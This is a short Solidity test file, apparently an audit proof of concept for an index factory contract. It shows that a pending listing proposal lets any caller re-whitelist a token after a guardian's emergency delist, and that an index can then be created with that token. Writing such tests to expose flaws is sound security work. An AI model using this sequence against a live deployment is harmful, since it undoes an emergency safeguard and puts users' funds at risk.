// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {IndexFactoryTest} from "../IndexFactory.t.sol";
import {IIndexFactory} from "../../src/interfaces/IIndexFactory.sol";

contract DelistRelistPoc is IndexFactoryTest {
    function test_poc_pendingConfigChangeUndoesDelist() public {
        IIndexFactory.TokenConfig memory next = market.config(address(a), 0);
        vm.prank(owner);
        factory.proposeListing(address(a), next); // routine config change for a listed token
        vm.prank(guardian);
        factory.delist(address(a)); // emergency delist
        assertFalse(factory.isWhitelisted(address(a)));
        vm.warp(factory.listingEta(address(a)));
        vm.prank(stranger);
        factory.executeListing(address(a)); // anyone
        assertTrue(factory.isWhitelisted(address(a)), "delist silently undone");
        (address[] memory t, uint256[] memory u) = _two();
        vm.prank(creator);
        factory.createIndex("X", "X", t, u, 0);
    }
}
